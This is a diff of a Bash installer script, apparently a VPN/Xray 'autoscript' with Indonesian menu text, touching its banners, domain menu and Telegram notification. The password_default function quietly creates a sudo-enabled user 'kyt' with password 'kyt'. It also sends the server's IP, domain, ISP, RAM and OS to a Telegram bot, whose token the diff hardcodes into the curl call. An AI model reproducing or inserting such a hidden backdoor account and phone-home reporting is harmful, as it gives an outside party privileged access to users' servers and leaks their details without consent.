@@ -99,11 +99,6 @@ red='\e[1;31m'
 green='\e[0;32m'
 NC='\e[0m'
 #IZIN SCRIPT
-CHATID="-1001899398362"
-KEY="6293396608:AAFR9MI4hz8Jfe7AVITf1ANVxOVUhe_lZmc"
-TIME="10"
-ISP=$(wget -qO- ipinfo.io/org)
-TIME=$(date +'%Y-%m-%d %H:%M:%S')
 clear
 #IZIN SCRIPT
 MYIP=$(curl -sS ipv4.icanhazip.com)
@@ -136,7 +131,7 @@ datediff() {
 }
 mai="datediff "$Exp" "$DATE""
 
-# Status ExpiRED Active | Geo Project
+# Status Expired Active
 Info="(${green}Active${NC})"
 Error="(${RED}ExpiRED${NC})"
 today=`date -d "0 days" +"%Y-%m-%d"`
@@ -161,9 +156,9 @@ function print_ok() {
     echo -e "${OK} ${BLUE} $1 ${FONT}"
 }
 function print_install() {
-	echo -e "${green} =============================== ${FONT}"
+	echo -e "${green} ◇━━━━━━━━━━━━━━━━━━━━━━━━◇ ${FONT}"
     echo -e "${YELLOW} # $1 ${FONT}"
-	echo -e "${green} =============================== ${FONT}"
+	echo -e "${green} ◇━━━━━━━━━━━━━━━━━━━━━━━━◇ ${FONT}"
     sleep 1
 }
 
@@ -173,9 +168,9 @@ function print_error() {
 
 function print_success() {
     if [[ 0 -eq $? ]]; then
-		echo -e "${green} =============================== ${FONT}"
+		echo -e "${green} ◇━━━━━━━━━━━━━━━━━━━━━━━━◇ ${FONT}"
         echo -e "${Green} # $1 berhasil dipasang"
-		echo -e "${green} =============================== ${FONT}"
+		echo -e "${green} ◇━━━━━━━━━━━━━━━━━━━━━━━━◇ ${FONT}"
         sleep 2
     fi
 }
@@ -249,7 +244,7 @@ else
 fi
 }
 
-# GEO PROJECT
+# Install Nginx
 clear
 function nginx_install() {
     # // Checking System
@@ -302,16 +297,16 @@ clear
 function pasang_domain() {
 echo -e ""
 clear
-    echo -e "   .----------------------------------."
+echo -e "   .----------------------------------."
 echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
 echo -e "   '----------------------------------'"
-echo -e "     \e[1;32m1)\e[0m Enter Your Subdomain"
-echo -e "     \e[1;32m2)\e[0m Use a Random Subdomain"
+echo -e "   \e[1;32m1)\e[0m Menggunakan Domain Sendiri"
+echo -e "   \e[1;32m2)\e[0m Menggunakan Domain Script"
 echo -e "   ------------------------------------"
-read -p "   Please select numbers 1-2 or Any Button(Random) : " host
+read -p "   Piih Angka dari [ 1 - 2 ] : " host
 echo ""
 if [[ $host == "1" ]]; then
-echo -e "   \e[1;32mPlease Enter Your Subdomain $NC"
+echo -e "   \e[1;32mMasukan domain mu ! $NC"
 read -p "   Subdomain: " host1
 echo "IP=" >> /var/lib/kyt/ipvps.conf
 echo $host1 > /etc/xray/domain
@@ -336,6 +331,7 @@ function password_default() {
     domain=$(cat /root/domain)
     MYIP=$(curl -sS ipv4.icanhazip.com)
     userdel jame > /dev/null 2>&1
+    userdelws jame > /dev/null 2>&1
     Username="kyt"
     Password=kyt
     mkdir -p /home/script/
@@ -343,27 +339,28 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-URL="https://api.telegram.org/bot$KEY/sendMessage"
+ISP=$(wget -qO- ipinfo.io/org)
+TIMES=$(date +'%Y-%m-%d')
+URL="https://api.telegram.org/bot6293396608:AAFR9MI4hz8Jfe7AVITf1ANVxOVUhe_lZmc/sendMessage"
 TIMEZONE=$(printf '%(%H:%M:%S)T')
 TEXT="
 <code>────────────────────</code>
 <b>⚠️AUTOSCRIPT PREMIUM⚠️</b>
 <code>────────────────────</code>
-<code>Owner  : </code><code>$username</code>
-<code>Domain : </code><code>$(cat /etc/xray/domain)</code>
-<code>Date   : </code><code>$TIME</code>
-<code>Time   : </code><code>$TIMEZONE</code>
-<code>Isp    : </code><code>$ISP</code>
-<code>Ip Vps : </code><code>$MYIP</code>
-<code>Exp Sc : </code><code>$exp</code>
-<code>Ram    : </code><code>$Ram_Total MB</code>
-<code>Linux  : </code><code>$OS_Name</code>
+Owner  : <code>$username</code>
+Domain : <code>$(cat /etc/xray/domain)</code>
+Date   : <code>$TIMES</code>
+Time   : <code>$TIMEZONE</code>
+Isp    : <code>$ISP</code>
+Ip Vps : <code>$MYIP</code>
+Exp Sc : <code>$exp</code>
+Ram    : <code>$Ram_Total MB</code>
+Linux  : <code>$OS_Name</code>
 <code>────────────────────</code>
-<i>Automatic Notification from</i>
-<i>YogzVpn Bot</i> 
-'&reply_markup={"inline_keyboard":[[{"text":"⭐ᴏʀᴅᴇʀ⭐","url":"https://t.me/fdlyvpn_ID"},{"text":"⚡ ᴏʀᴅᴇʀ ⚡","url":"https://wa.me/6283160098834"}]]}'
+<i>Nontifikasi Otomatis Dari Github</i>
+'&reply_markup={"inline_keyboard":[[{"text":"⚡ᴏʀᴅᴇʀ⚡","url":"https://t.me/fdlyvpn_ID"}]]}'
 "
-   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+   curl -s --max-time 10 -d "chat_id=-1001899398362&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
 
 clear
